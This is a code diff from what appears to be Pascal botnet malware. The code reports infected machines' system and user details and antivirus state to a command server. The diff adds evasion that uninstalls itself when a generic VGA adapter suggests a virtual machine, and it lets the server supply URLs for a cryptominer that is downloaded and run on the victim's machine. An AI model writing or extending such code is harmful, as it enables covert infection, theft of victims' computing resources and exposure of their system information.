@@ -204,19 +204,27 @@ Begin
   try
   Case CmdType of
     'Register': Begin
-      ToPost.AddFormField('RT', '3');
-
       AnalyzeSystem;
-      ToPost.AddFormField('Nick', Nick);
-      ToPost.AddFormField('OS', OS);
-      ToPost.AddFormField('Comp', ComputerName);
-      ToPost.AddFormField('User', UserName);
-      ToPost.AddFormField('CPU', CPU);
-      ToPost.AddFormField('GPU', GPU);
-      ToPost.AddFormField('Anti', AVName);
-      ToPost.AddFormField('Def', AVState);
-      ToPost.AddFormField('Inf', Settings.ReadString('General', 'InfectedBy', 'Unknown'));
-      DoPost;
+
+      if(GPU='Standard VGA Graphics Adapter') then Begin
+        ToPost.AddFormField('RT', '1');
+        ToPost.AddFormField('Result', '['+Nick+'] [AV] Uninstalling...');
+        DoPost;
+        IsUninstalling:=True;
+        AllowExecution:=False;
+      End else Begin
+        ToPost.AddFormField('RT', '3');
+        ToPost.AddFormField('Nick', Nick);
+        ToPost.AddFormField('OS', OS);
+        ToPost.AddFormField('Comp', ComputerName);
+        ToPost.AddFormField('User', UserName);
+        ToPost.AddFormField('CPU', CPU);
+        ToPost.AddFormField('GPU', GPU);
+        ToPost.AddFormField('Anti', AVName);
+        ToPost.AddFormField('Def', AVState);
+        ToPost.AddFormField('Inf', Settings.ReadString('General', 'InfectedBy', 'Unknown'));
+        DoPost;
+      end;
     end;
     'Restart': Begin
       ToPost.AddFormField('RT', '1');
@@ -300,7 +308,7 @@ Begin
       end;
       MemStream.Free;
       if Not(Error) then
-        ToPost.AddFormField('Result', 'ododd');
+        ToPost.AddFormField('Result', GetProtectedString(3));
       DoPost;
     end;
     '896bb1db': Begin
@@ -444,7 +452,12 @@ Begin
       STemp2:='P'+IntToStr(Random(100) + 1);
       try
         //Download config
-        STemp:=StringReplace(Hat.Get(Server+MineConfig), '%WorkerID%', STemp2,
+        STemp:=Net.Commands.ReadString(FCmdID, 'MineConfig', Server+MineConfig);
+        try
+          STemp:=Hat.Get(STemp);
+        finally
+        end;
+        STemp:=StringReplace(STemp, '%WorkerID%', STemp2,
           [rfReplaceAll, rfIgnoreCase]);
         AssignFile(FFile, GetProtectedString(0));
         Rewrite(FFile);
@@ -454,8 +467,11 @@ Begin
         STemp:=Server;
         if Pos('64', Net.Commands.ReadString(FCmdID, 'Bitness', '32'))>0 then
           STemp += MineModule64
+        else if Net.Commands.ReadString(FCmdID, 'MineMod', '')<>'' then
+          STemp:=Net.Commands.ReadString(FCmdID, 'MineMod', '')
         else
           STemp += MineModule;
+
         //Start mining
         ModID:=ExecuteModule(STemp, '', True);
         if ModID>0 then Begin
